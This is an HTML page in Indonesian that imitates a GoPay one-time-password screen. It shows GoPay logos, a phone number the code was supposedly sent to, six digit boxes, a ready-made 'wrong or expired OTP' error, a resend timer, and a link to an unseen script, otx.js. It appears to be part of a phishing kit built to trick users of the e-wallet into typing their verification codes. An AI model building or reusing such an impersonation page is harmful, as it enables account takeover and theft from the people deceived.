<!-- otp.html -->
<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,
initial-scale=1.0,
maximum-scale=1.0,
user-scalable=no">

<title>AJUKAN</title>

<link rel="stylesheet"
href="otx.css">

</head>
<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img
        src="assets/logo-gopay.png"
        class="logo">

    </div>

    <!-- SOUND -->
<audio
id="successSound"
autoplay>

<source
src="assets/successss.mp3"
type="audio/mpeg">

</audio>

    <!-- TITLE -->
    <div class="title">

        Kode <b>OTP</b>
        telah terkirim ke

    </div>

    <!-- NOMOR -->
    <div class="number-box">

        <div class="flag-box">

            <img
            src="assets/flag-id.png"
            class="flag">

        </div>

        <span class="kode">
            +62
        </span>

        <span class="nomor phone-number">
            822-7697-59061
        </span>

    </div>

    <!-- VIA -->
    <div class="via">

        via

        <span class="wa-box">

            <img
            src="assets/wa.png"
            class="via-icon">

            WhatsApp

        </span>

        /

        <span class="sms-box">

            <img
            src="assets/sms.png"
            class="via-icon">

            SMS

        </span>

    </div>

    <!-- OTP -->
    <div class="otp-container">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

        <input
        type="tel"
        class="otp-box"
        maxlength="1">

    </div>

    <!-- ALERT -->
    <div class="alert-box error-box">

        <div class="alert-title">

            Kode OTP salah atau kadaluarsa

        </div>

        <div class="alert-desc">

            Pastikan Kode OTP yang kamu
            masukan benar dan tidak kadaluarsa

        </div>

    </div>

    <!-- RESEND -->
    <div class="resend-box">

        <button
        class="resend-btn">

            KIRIM ULANG

        </button>

        <div class="timer">

            00:60

        </div>

    </div>

<!-- LOADING -->
<div class="loading-box"
id="loadingBox">

    <div class="loading-circle">

        <div class="spinner-ring"></div>

        <img
        src="assets/gopay-icon.png"
        class="loading-logo">

    </div>

    <div class="loading-text">

        Memuat...

    </div>

</div>

<script src="otx.js"></script>

</body>
</html>
